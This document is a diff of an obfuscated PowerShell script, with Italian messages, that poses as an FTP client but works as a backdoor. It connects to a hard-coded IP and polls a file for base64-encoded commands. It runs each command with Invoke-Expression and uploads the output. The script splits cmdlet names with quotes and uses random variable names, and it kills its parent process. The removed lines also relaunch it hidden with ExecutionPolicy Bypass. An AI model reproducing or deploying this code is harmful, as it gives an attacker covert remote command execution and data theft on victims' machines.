@@ -1,53 +1,36 @@
-param(
-    [switch]$Detached
-)
-if (-not $Detached) {
-    $e3fa304f6d73494bb322ff156a495557 = (Get-Process -Id $PID).Path
-    S''t''a''rt''-''P''ro''c''es''s `
-        -FilePath $e3fa304f6d73494bb322ff156a495557 `
-        -ArgumentList @(
-            '-NoProfile',
-            '-ExecutionPolicy', 'Bypass',
-            '-File', $PSCommandPath,
-            '-Detached'
-        ) `
-        -WindowStyle Hidden `
-        -WorkingDirectory (Split-Path -Parent $PSCommandPath)
-    exit
-}
-$469eddb533e3438eb5bae477f4cb2c91   = "151.67.18.144"
-$4a275d9e82f64d038c6765faf576f6f6 = 21
-$9ef65d1477d54ae9b9ffaadb7d97935f   = 10092
-$0988ff7ff53540cea9468073d9a71d0b    = "usrftp"
-$1c25133ed2bf490a80221e8319f78767    = "myPassword"
-$c632b055fe804c1d897baaa1650b7f1a  = "downloadME.txt"
-$977288137aae40dd87db2a0eb768c434    = "uploadME.txt"
-$ad0769c520ae4c99a85caa24b38a041f = "CONTENUTO DE''L FILE DA UPLODARE"
-$e071092ce7cb4d55b080ef25a6609cc5  = $false
-$57daadee3da54ad8b9dccfa636de29f1 = $true
-$95614965653d4f88aa40f30f79801cbd = 5000
-$0749e3e34d0a4b24b17b5742b4a6914e    = 300000
-$bedc21c91f0b4f3390257f901dd9801a= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | S''el''e''c''t -Expand ParentProcessId) 2>$null
-if ($bedc21c91f0b4f3390257f901dd9801a) { Stop''-P''rocess -Id $bedc21c91f0b4f3390257f901dd9801a -Force -ErrorAction SilentlyContinue }
-function out($msg, $aea9d1e1b99148e39a95b22f10150619 = "White") {
-    if (-not $57daadee3da54ad8b9dccfa636de29f1) {
-        if ($aea9d1e1b99148e39a95b22f10150619 -eq "White") { W''rite-H''o''st $msg }
-        else { W''r''i''t''e''-H''o''st $msg -ForegroundColor $aea9d1e1b99148e39a95b22f10150619 }
+$5794ca5183eb4ac19bd9f2cb80b21ce5   = "151.81.18.80"
+$a29e3ff3458d4fc5952e8af4b5e1c41c = 21
+$fae6515252b54601bfec4cf8e81da41a   = 10092
+$aa6e3d1f7c6f48a6b6ee448c3adb47a7    = "usrftp"
+$52acc388374b47ad88a21317a4137995    = "myPassword"
+$ddf35e2783e74cf0a66b1097d910142d  = "downloadME.txt"
+$b600e49acf0a43bf86ffa96ebc6ca8f2    = "uploadME.txt"
+$eaeb345faf2a464b98bfd38c11298a5a = "CONTENUTO DE''L FILE DA UPLODARE"
+$3ad43e2003af4b789860d1be72438f69  = $false
+$593d42a58aa149f58a25203eaf60ac8c = $true
+$fbb05a952bc14a74b5c2b3abc57a6975 = 5000
+$9258360818dc41af9eb7db05fb100720    = 300000
+$208802eefaba4615a365381ad6800e80= (Get-WmiObject Win32_Process -Filter "ProcessId=$PID" | S''e''l''e''ct -Expand ParentProcessId) 2>$null
+if ($208802eefaba4615a365381ad6800e80) { St''o''p''-''P''ro''c''e''s''s -Id $208802eefaba4615a365381ad6800e80 -Force -ErrorAction SilentlyContinue }
+function out($msg, $6d16daebe00b4176a32f187eaa499e2d = "White") {
+    if (-not $593d42a58aa149f58a25203eaf60ac8c) {
+        if ($6d16daebe00b4176a32f187eaa499e2d -eq "White") { W''r''i''t''e-Ho''st $msg }
+        else { Write''-Hos''t $msg -ForegroundColor $6d16daebe00b4176a32f187eaa499e2d }
     }
 }
 function dbg($msg) {
-    if ($e071092ce7cb4d55b080ef25a6609cc5 -and -not $57daadee3da54ad8b9dccfa636de29f1) {
-        $c8cb7be35e5546809d96005763061b67 = (Get-Date).ToString("HH:mm:ss.fff")
-        Wri''te-Host "  [DBG $c8cb7be35e5546809d96005763061b67] $msg" -ForegroundColor Cyan
+    if ($3ad43e2003af4b789860d1be72438f69 -and -not $593d42a58aa149f58a25203eaf60ac8c) {
+        $ed3c522cbf1344269ad7e9450ad41225 = (Get-Date).ToString("HH:mm:ss.fff")
+        Write''-H''o''st "  [DBG $ed3c522cbf1344269ad7e9450ad41225] $msg" -ForegroundColor Cyan
     }
 }
 function Send-Command($stream, $cmd) {
     dbg ">>> Invio comando: $cmd"
-    $142718526cd24a9888e79c6419f4146a = [System.Text.Encoding]::ASCII.GetBytes($cmd + "`r`n")
+    $fc6d9a5865e04bdd9f681b13eb5ef093 = [System.Text.Encoding]::ASCII.GetBytes($cmd + "`r`n")
     try {
-        $stream.Write($142718526cd24a9888e79c6419f4146a, 0, $142718526cd24a9888e79c6419f4146a.Length)
+        $stream.Write($fc6d9a5865e04bdd9f681b13eb5ef093, 0, $fc6d9a5865e04bdd9f681b13eb5ef093.Length)
         $stream.Flush()
-        dbg "    Comando inviato ($($142718526cd24a9888e79c6419f4146a.Length) bytes)"
+        dbg "    Comando inviato ($($fc6d9a5865e04bdd9f681b13eb5ef093.Length) bytes)"
     } catch {
         out "[ERRORE] Impossibile inviare il comando: $_" "Red"
         throw
@@ -55,167 +38,167 @@ function Send-Command($stream, $cmd) {
     out "[C->S] $cmd"
 }
 function Read-Response($reader) {
-    dbg "    In attesa risposta dal server (timeout $($0749e3e34d0a4b24b17b5742b4a6914e)ms)..."
+    dbg "    In attesa risposta dal server (timeout $($9258360818dc41af9eb7db05fb100720)ms)..."
     try {
-        $c63d20fbc07e4493addf6833491a849a = $reader.ReadLine()
-        if ($null -eq $c63d20fbc07e4493addf6833491a849a) {
+        $c00346ca70fd45eca2e25b3bdac94393 = $reader.ReadLine()
+        if ($null -eq $c00346ca70fd45eca2e25b3bdac94393) {
             out "[ERRORE] Connessione chiusa dal server (ReadLine = null)" "Red"
             throw "Server ha chiuso la connessione"
         }
-        dbg "    Risposta ricevuta: $c63d20fbc07e4493addf6833491a849a"
-        out "[S->C] $c63d20fbc07e4493addf6833491a849a"
-        return $c63d20fbc07e4493addf6833491a849a
+        dbg "    Risposta ricevuta: $c00346ca70fd45eca2e25b3bdac94393"
+        out "[S->C] $c00346ca70fd45eca2e25b3bdac94393"
+        return $c00346ca70fd45eca2e25b3bdac94393
     } catch {
         out "[ERRORE] Timeout o errore lettura risposta: $_" "Red"
         throw
     }
 }
 function New-TcpConnection($ip, $port) {
-    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($95614965653d4f88aa40f30f79801cbd)ms) ..."
-    $7dbae955685447f28ea6f8670ee3d9bf = N''ew''-''O''b''jec''t System.Net.Sockets.TcpClient
-    $9e66c5f737c94f02a777f92a069b12e9 = $7dbae955685447f28ea6f8670ee3d9bf.BeginConnect($ip, $port, $null, $null)
-    $055b5797e2684122bbd354a72e423400 = $9e66c5f737c94f02a777f92a069b12e9.AsyncWaitHandle.WaitOne($95614965653d4f88aa40f30f79801cbd, $false)
-    if (-not $055b5797e2684122bbd354a72e423400) {
-        $7dbae955685447f28ea6f8670ee3d9bf.Close()
-        throw "Timeout connessione TCP a ${ip}:${port} dopo $($95614965653d4f88aa40f30f79801cbd)ms"
+    dbg "Tentativo connessione TCP a ${ip}:${port} (timeout $($fbb05a952bc14a74b5c2b3abc57a6975)ms) ..."
+    $d3a71d2c708641ce833c67669b9afa4d = Ne''w-''O''bj''ect System.Net.Sockets.TcpClient
+    $82f2131ba2f54e23ba0c84eeb44d093f = $d3a71d2c708641ce833c67669b9afa4d.BeginConnect($ip, $port, $null, $null)
+    $1496458a5cb648e788e91ca669b3b11d = $82f2131ba2f54e23ba0c84eeb44d093f.AsyncWaitHandle.WaitOne($fbb05a952bc14a74b5c2b3abc57a6975, $false)
+    if (-not $1496458a5cb648e788e91ca669b3b11d) {
+        $d3a71d2c708641ce833c67669b9afa4d.Close()
+        throw "Timeout connessione TCP a ${ip}:${port} dopo $($fbb05a952bc14a74b5c2b3abc57a6975)ms"
     }
-    try { $7dbae955685447f28ea6f8670ee3d9bf.EndConnect($9e66c5f737c94f02a777f92a069b12e9) } catch {
-        $7dbae955685447f28ea6f8670ee3d9bf.Close()
+    try { $d3a71d2c708641ce833c67669b9afa4d.EndConnect($82f2131ba2f54e23ba0c84eeb44d093f) } catch {
+        $d3a71d2c708641ce833c67669b9afa4d.Close()
         throw "Connessione TCP a ${ip}:${port} fallita: $_"
     }
-    dbg "Connessione TCP stabilita. LocalEndPoint=$($7dbae955685447f28ea6f8670ee3d9bf.Client.LocalEndPoint)"
-    return $7dbae955685447f28ea6f8670ee3d9bf
+    dbg "Connessione TCP stabilita. LocalEndPoint=$($d3a71d2c708641ce833c67669b9afa4d.Client.LocalEndPoint)"
+    return $d3a71d2c708641ce833c67669b9afa4d
 }
 out ""
 out "[CLIENT] Avvio connessione FTP verso ${SERVER_IP}:${SERVER_PORT}" "Yellow"
 dbg "Creazione TcpClient per canale di controllo..."
 try {
-    $9404bd1293504d88a27961bdfb742904 = New-TcpConnection $469eddb533e3438eb5bae477f4cb2c91 $4a275d9e82f64d038c6765faf576f6f6
+    $e29b4a57ddc9438586a4ec5365af7c30 = New-TcpConnection $5794ca5183eb4ac19bd9f2cb80b21ce5 $a29e3ff3458d4fc5952e8af4b5e1c41c
 } catch {
     out "[ERRORE FATALE] $_" "Red"
-    out "  Verifica: IP corretto? Server avviato? Firewall aperto sulla porta $4a275d9e82f64d038c6765faf576f6f6?" "Yellow"
+    out "  Verifica: IP corretto? Server avviato? Firewall aperto sulla porta $a29e3ff3458d4fc5952e8af4b5e1c41c?" "Yellow"
     exit 1
 }
-$362f5b5126104c8f9e74063de2a451f6 = $9404bd1293504d88a27961bdfb742904.GetStream()
-$362f5b5126104c8f9e74063de2a451f6.ReadTimeout  = $0749e3e34d0a4b24b17b5742b4a6914e
-$362f5b5126104c8f9e74063de2a451f6.WriteTimeout = $0749e3e34d0a4b24b17b5742b4a6914e
-$ba3dd563ff3a4e27935b390647b8d029 = N''ew-''Obj''e''c''t System.IO.StreamReader($362f5b5126104c8f9e74063de2a451f6, [System.Text.Encoding]::ASCII)
-dbg "Stream di controllo pronto. In attesa de''l banner 220..."
-try { $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029 } catch { out "[ERRORE FATALE] $_" "Red"; exit 1 }
+$1a062dd122674c96a75ac1120c8cbd4c = $e29b4a57ddc9438586a4ec5365af7c30.GetStream()
+$1a062dd122674c96a75ac1120c8cbd4c.ReadTimeout  = $9258360818dc41af9eb7db05fb100720
+$1a062dd122674c96a75ac1120c8cbd4c.WriteTimeout = $9258360818dc41af9eb7db05fb100720
+$b4a96b18bf4745f6ac12a104b0c9e728 = Ne''w''-''O''b''j''ec''t System.IO.StreamReader($1a062dd122674c96a75ac1120c8cbd4c, [System.Text.Encoding]::ASCII)
+dbg "Stream di controllo pronto. In attesa d''el banner 220..."
+try { $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728 } catch { out "[ERRORE FATALE] $_" "Red"; exit 1 }
 out ""
 out "[CLIENT] FASE 1 - Autenticazione" "Yellow"
 try {
-    Send-Command $362f5b5126104c8f9e74063de2a451f6 "USER $0988ff7ff53540cea9468073d9a71d0b"
-    $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-    Send-Command $362f5b5126104c8f9e74063de2a451f6 "PASS $1c25133ed2bf490a80221e8319f78767"
-    $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-} catch { out "[ERRORE FATALE] $_" "Red"; $9404bd1293504d88a27961bdfb742904.Close(); exit 1 }
-if ($ef0ea00b96c14cd1bf2395438d289fd1 -notmatch "^230") {
-    out "[CLIENT] Autenticazione fallita (risposta: $ef0ea00b96c14cd1bf2395438d289fd1). Disconnessione." "Red"
-    $9404bd1293504d88a27961bdfb742904.Close()
+    Send-Command $1a062dd122674c96a75ac1120c8cbd4c "USER $aa6e3d1f7c6f48a6b6ee448c3adb47a7"
+    $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+    Send-Command $1a062dd122674c96a75ac1120c8cbd4c "PASS $52acc388374b47ad88a21317a4137995"
+    $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+} catch { out "[ERRORE FATALE] $_" "Red"; $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1 }
+if ($012138cdf4384ab7ac594a709df70262 -notmatch "^230") {
+    out "[CLIENT] Autenticazione fallita (risposta: $012138cdf4384ab7ac594a709df70262). Disconnessione." "Red"
+    $e29b4a57ddc9438586a4ec5365af7c30.Close()
     exit 1
 }
 out "[CLIENT] Autenticazione riuscita." "Green"
 dbg "Invio TYPE I ..."
 try {
-    Send-Command $362f5b5126104c8f9e74063de2a451f6 "TYPE I"
-    $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-} catch { out "[ERRORE FATALE] $_" "Red"; $9404bd1293504d88a27961bdfb742904.Close(); exit 1 }
-$50cec208047745ffa0c79cbc2731f769 = 0
+    Send-Command $1a062dd122674c96a75ac1120c8cbd4c "TYPE I"
+    $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+} catch { out "[ERRORE FATALE] $_" "Red"; $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1 }
+$5e1eda6015b4406fbe57f6a57395d6b1 = 0
 while ($true) {
-    $50cec208047745ffa0c79cbc2731f769++
+    $5e1eda6015b4406fbe57f6a57395d6b1++
     out ""
-    out "[CLIENT] --- Iterazione $50cec208047745ffa0c79cbc2731f769 ---" "Yellow"
+    out "[CLIENT] --- Iterazione $5e1eda6015b4406fbe57f6a57395d6b1 ---" "Yellow"
     out "[CLIENT] FASE 3+4 - Modalita passiva + Download" "Yellow"
     try {
         dbg "Invio EPSV per canale download..."
-        Send-Command $362f5b5126104c8f9e74063de2a451f6 "EPSV"
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
+        Send-Command $1a062dd122674c96a75ac1120c8cbd4c "EPSV"
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
         dbg "Invio SIZE..."
-        Send-Command $362f5b5126104c8f9e74063de2a451f6 "SIZE $c632b055fe804c1d897baaa1650b7f1a"
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
+        Send-Command $1a062dd122674c96a75ac1120c8cbd4c "SIZE $ddf35e2783e74cf0a66b1097d910142d"
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
         dbg "Invio RETR..."
-        Send-Command $362f5b5126104c8f9e74063de2a451f6 "RETR $c632b055fe804c1d897baaa1650b7f1a"
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-    } catch { out "[ERRORE FATALE] $_" "Red"; $9404bd1293504d88a27961bdfb742904.Close(); exit 1 }
+        Send-Command $1a062dd122674c96a75ac1120c8cbd4c "RETR $ddf35e2783e74cf0a66b1097d910142d"
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+    } catch { out "[ERRORE FATALE] $_" "Red"; $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1 }
     dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} ..."
     try {
-        $4a51f1caffa942c1a12e6f6357ca1ebd = New-TcpConnection $469eddb533e3438eb5bae477f4cb2c91 $9ef65d1477d54ae9b9ffaadb7d97935f
+        $4e3dfe641c5d48109265128245f70e42 = New-TcpConnection $5794ca5183eb4ac19bd9f2cb80b21ce5 $fae6515252b54601bfec4cf8e81da41a
     } catch {
         out "[ERRORE FATALE canale dati RETR] $_" "Red"
-        out "  Verifica: firewall aperto sulla porta $9ef65d1477d54ae9b9ffaadb7d97935f?" "Yellow"
-        $9404bd1293504d88a27961bdfb742904.Close(); exit 1
+        out "  Verifica: firewall aperto sulla porta $fae6515252b54601bfec4cf8e81da41a?" "Yellow"
+        $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1
     }
-    $c5621d59a8b74d45b028c39c8206442e = $4a51f1caffa942c1a12e6f6357ca1ebd.GetStream()
-    $c5621d59a8b74d45b028c39c8206442e.ReadTimeout = $0749e3e34d0a4b24b17b5742b4a6914e
+    $66874c4572f84a8fabc797765a30a749 = $4e3dfe641c5d48109265128245f70e42.GetStream()
+    $66874c4572f84a8fabc797765a30a749.ReadTimeout = $9258360818dc41af9eb7db05fb100720
     dbg "Canale dati aperto. Lettura contenuto file..."
-    $d4c5adb6dc374994873da77b58ae3089 = N''e''w''-O''b''je''c''t System.IO.MemoryStream
+    $be8173745fe847a48b9cd5c4b21f52c2 = N''e''w''-''O''b''j''e''c''t System.IO.MemoryStream
     try {
-        $c5621d59a8b74d45b028c39c8206442e.CopyTo($d4c5adb6dc374994873da77b58ae3089)
+        $66874c4572f84a8fabc797765a30a749.CopyTo($be8173745fe847a48b9cd5c4b21f52c2)
     } catch {
         dbg "CopyTo interrotto (puo essere normale a fine stream): $_"
     }
-    $4a51f1caffa942c1a12e6f6357ca1ebd.Close()
-    dbg "Canale dati chiuso. Bytes ricevuti: $($d4c5adb6dc374994873da77b58ae3089.Length)"
-    $5d77351a70d0408bb2286590e90a7cc0 = [System.Text.Encoding]::ASCII.GetString($d4c5adb6dc374994873da77b58ae3089.ToArray())
-	dbg "Ricevuto: $5d77351a70d0408bb2286590e90a7cc0"
-	if ($5d77351a70d0408bb2286590e90a7cc0.StartsWith("AAA")) {
-       $8c1388bf1714482582bcb603a88ff02f = $5d77351a70d0408bb2286590e90a7cc0.Substring(3)
+    $4e3dfe641c5d48109265128245f70e42.Close()
+    dbg "Canale dati chiuso. Bytes ricevuti: $($be8173745fe847a48b9cd5c4b21f52c2.Length)"
+    $08824dfff7674ab5b6b77c385a2b215a = [System.Text.Encoding]::ASCII.GetString($be8173745fe847a48b9cd5c4b21f52c2.ToArray())
+	dbg "Ricevuto: $08824dfff7674ab5b6b77c385a2b215a"
+	if ($08824dfff7674ab5b6b77c385a2b215a.StartsWith("AAA")) {
+       $47e0c60432dd4d5ab9abc879b13c40ae = $08824dfff7674ab5b6b77c385a2b215a.Substring(3)
     }
-    $142718526cd24a9888e79c6419f4146a = [Convert]::FromBase64String($8c1388bf1714482582bcb603a88ff02f)
-    $5d77351a70d0408bb2286590e90a7cc0 = [System.Text.Encoding]::UTF8.GetString($142718526cd24a9888e79c6419f4146a)
-	if (-not $57daadee3da54ad8b9dccfa636de29f1) {
-	    W''rit''e''-''H''os''t "Ricevuto: $5d77351a70d0408bb2286590e90a7cc0" -ForegroundColor Magenta
+    $fc6d9a5865e04bdd9f681b13eb5ef093 = [Convert]::FromBase64String($47e0c60432dd4d5ab9abc879b13c40ae)
+    $08824dfff7674ab5b6b77c385a2b215a = [System.Text.Encoding]::UTF8.GetString($fc6d9a5865e04bdd9f681b13eb5ef093)
+	if (-not $593d42a58aa149f58a25203eaf60ac8c) {
+	    Wri''te''-H''os''t "Ricevuto: $08824dfff7674ab5b6b77c385a2b215a" -ForegroundColor Magenta
 	}
     try {
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-    } catch { out "[ERRORE FATALE] $_" "Red"; $9404bd1293504d88a27961bdfb742904.Close(); exit 1 }
-    if ($5d77351a70d0408bb2286590e90a7cc0.Trim().ToUpper() -eq "QUIT") {
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+    } catch { out "[ERRORE FATALE] $_" "Red"; $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1 }
+    if ($08824dfff7674ab5b6b77c385a2b215a.Trim().ToUpper() -eq "QUIT") {
         out "[CLIENT] Ricevuto QUIT. Disconnessione." "Green"
         break
     }
     out "[CLIENT] FASE 5 - Modalita passiva + Upload" "Yellow"
     try {
         dbg "Invio EPSV per canale upload..."
-        Send-Command $362f5b5126104c8f9e74063de2a451f6 "EPSV"
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
+        Send-Command $1a062dd122674c96a75ac1120c8cbd4c "EPSV"
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
         dbg "Invio STOR..."
-        Send-Command $362f5b5126104c8f9e74063de2a451f6 "STOR $977288137aae40dd87db2a0eb768c434"
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-    } catch { out "[ERRORE FATALE] $_" "Red"; $9404bd1293504d88a27961bdfb742904.Close(); exit 1 }
+        Send-Command $1a062dd122674c96a75ac1120c8cbd4c "STOR $b600e49acf0a43bf86ffa96ebc6ca8f2"
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+    } catch { out "[ERRORE FATALE] $_" "Red"; $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1 }
     dbg "Apertura connessione dati verso ${SERVER_IP}:${DATA_PORT} per upload..."
     try {
-        $4a51f1caffa942c1a12e6f6357ca1ebd = New-TcpConnection $469eddb533e3438eb5bae477f4cb2c91 $9ef65d1477d54ae9b9ffaadb7d97935f
+        $4e3dfe641c5d48109265128245f70e42 = New-TcpConnection $5794ca5183eb4ac19bd9f2cb80b21ce5 $fae6515252b54601bfec4cf8e81da41a
     } catch {
         out "[ERRORE FATALE canale dati STOR] $_" "Red"
-        out "  Verifica: firewall aperto sulla porta $9ef65d1477d54ae9b9ffaadb7d97935f?" "Yellow"
-        $9404bd1293504d88a27961bdfb742904.Close(); exit 1
+        out "  Verifica: firewall aperto sulla porta $fae6515252b54601bfec4cf8e81da41a?" "Yellow"
+        $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1
     }
-    $7d84fa0971214820ac959052a4ca6cef = I''nv''o''k''e-E''x''p''r''e''ss''i''o''n $5d77351a70d0408bb2286590e90a7cc0 2>&1 | O''ut''-''S''t''ri''n''g
-	if (-not $57daadee3da54ad8b9dccfa636de29f1) {
-          W''r''i''t''e''-''H''o''s''t "Sto per inviare: $7d84fa0971214820ac959052a4ca6cef" -ForegroundColor Magenta
+    $732aa341dd96414aba59cef5634fd9cd = Invo''ke-Exp''re''s''sion $08824dfff7674ab5b6b77c385a2b215a 2>&1 | O''u''t''-''Str''i''n''g
+	if (-not $593d42a58aa149f58a25203eaf60ac8c) {
+          W''r''ite-Host "Sto per inviare: $732aa341dd96414aba59cef5634fd9cd" -ForegroundColor Magenta
     }
-    $142718526cd24a9888e79c6419f4146a = [System.Text.Encoding]::UTF8.GetBytes($7d84fa0971214820ac959052a4ca6cef)
-    $61944d16454c42f59bcf97115ebe5721 = [Convert]::ToBase64String($142718526cd24a9888e79c6419f4146a)
-    $ad0769c520ae4c99a85caa24b38a041f = "AAA" + $61944d16454c42f59bcf97115ebe5721
-    $c5621d59a8b74d45b028c39c8206442e = $4a51f1caffa942c1a12e6f6357ca1ebd.GetStream()
-    $c5621d59a8b74d45b028c39c8206442e.WriteTimeout = $0749e3e34d0a4b24b17b5742b4a6914e
-    $a3ed495928464c3491361f0a7684b940 = [System.Text.Encoding]::ASCII.GetBytes($ad0769c520ae4c99a85caa24b38a041f)
-    dbg "Invio $($a3ed495928464c3491361f0a7684b940.Length) bytes sul canale dati..."
+    $fc6d9a5865e04bdd9f681b13eb5ef093 = [System.Text.Encoding]::UTF8.GetBytes($732aa341dd96414aba59cef5634fd9cd)
+    $cf544cdc7ea04efcbe8a28c26ada2c8a = [Convert]::ToBase64String($fc6d9a5865e04bdd9f681b13eb5ef093)
+    $eaeb345faf2a464b98bfd38c11298a5a = "AAA" + $cf544cdc7ea04efcbe8a28c26ada2c8a
+    $66874c4572f84a8fabc797765a30a749 = $4e3dfe641c5d48109265128245f70e42.GetStream()
+    $66874c4572f84a8fabc797765a30a749.WriteTimeout = $9258360818dc41af9eb7db05fb100720
+    $4a51fa8ad005441780c8f10cdf35a4ff = [System.Text.Encoding]::ASCII.GetBytes($eaeb345faf2a464b98bfd38c11298a5a)
+    dbg "Invio $($4a51fa8ad005441780c8f10cdf35a4ff.Length) bytes sul canale dati..."
     try {
-        $c5621d59a8b74d45b028c39c8206442e.Write($a3ed495928464c3491361f0a7684b940, 0, $a3ed495928464c3491361f0a7684b940.Length)
-        $c5621d59a8b74d45b028c39c8206442e.Flush()
+        $66874c4572f84a8fabc797765a30a749.Write($4a51fa8ad005441780c8f10cdf35a4ff, 0, $4a51fa8ad005441780c8f10cdf35a4ff.Length)
+        $66874c4572f84a8fabc797765a30a749.Flush()
     } catch {
         out "[ERRORE FATALE invio dati STOR] $_" "Red"
-        $9404bd1293504d88a27961bdfb742904.Close(); exit 1
+        $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1
     }
-    $4a51f1caffa942c1a12e6f6357ca1ebd.Close()
+    $4e3dfe641c5d48109265128245f70e42.Close()
     dbg "Canale dati upload chiuso."
     try {
-        $ef0ea00b96c14cd1bf2395438d289fd1 = Read-Response $ba3dd563ff3a4e27935b390647b8d029
-    } catch { out "[ERRORE FATALE] $_" "Red"; $9404bd1293504d88a27961bdfb742904.Close(); exit 1 }
+        $012138cdf4384ab7ac594a709df70262 = Read-Response $b4a96b18bf4745f6ac12a104b0c9e728
+    } catch { out "[ERRORE FATALE] $_" "Red"; $e29b4a57ddc9438586a4ec5365af7c30.Close(); exit 1 }
     out "[CLIENT] Upload completato." "Green"
 }
-$9404bd1293504d88a27961bdfb742904.Close()
+$e29b4a57ddc9438586a4ec5365af7c30.Close()
 out ""
 out "[CLIENT] Connessione chiusa. Client terminato." "Green"
